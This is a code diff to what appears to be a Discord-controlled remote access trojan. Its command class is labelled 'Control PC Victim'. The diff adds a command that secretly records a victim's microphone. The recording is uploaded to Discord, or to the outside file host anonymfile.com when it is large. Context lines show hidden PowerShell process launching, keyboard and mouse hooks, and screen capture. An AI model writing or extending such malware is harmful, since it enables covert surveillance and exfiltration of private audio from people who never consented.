@@ -3,12 +3,14 @@ import discord, asyncio, os, subprocess, requests, psutil, json, win32api, win32
 from discord import app_commands
 from discord.ext import commands
 
+import sounddevice as sd
 from PIL import ImageGrab
 from core.info import Info
 from core.sender import Sender
 from discord.ext import commands
 from urllib.parse import urlparse
 from pynput import keyboard, mouse
+from scipy.io.wavfile import write
 from utils import CheckHwid, SendOutput
 
 pc = Info()
@@ -200,6 +202,33 @@ class Control(commands.Cog, description='Control PC Victim'):
 			return
 		output = str(subprocess.check_output(f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {process} -ArgumentList \"{agruments}\" "'), 'utf-8')
 		await SendOutput(interaction, output)
+
+	@app_commands.command(description='Record Audio in PC Victim')
+	async def recordaudio(self, interaction, hwid: str = '', duration: int = 5):
+		if not CheckHwid(hwid):
+			return
+		path_audio = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\rcad.wav"
+		freq = 44100
+		recording = sd.rec(int(duration * freq),
+				   samplerate=freq, channels=2)
+		await SendOutput(interaction, "Starting Recording")
+		sd.wait()
+		write(path_audio, freq, recording)
+		if os.path.getsize(path_audio) < 25000000:
+			filename = os.path.basename(path_audio)
+			file = discord.File(path_audio, filename=filename)
+			await SendOutput(interaction, f"Upload Audio {filename}")
+			await interaction.send(file=file)
+		else:
+			filename = os.path.basename(path_audio)
+			file = {"file": open(path_audio, 'rb')}
+			r = requests.post('https://anonymfile.com/api/v1/upload', files=file)
+			json_r = json.loads(r.text)
+			if not json_r['status']:
+				await SendOutput(interaction, f"Upload Audio {path_audio} To Anonymfile Failed")
+				return
+			url_file = json_r['data']['file']['url']['full']
+			await SendOutput(interaction, f"Upload Audio {filename} To Anonymfile Success\nUrl Audio: {url_file}")
 
 async def setup(bot):
 	await bot.add_cog(Control(bot), guilds = [discord.Object(id = 1128326638757761125), discord.Object(id = 1117628520273813536)])
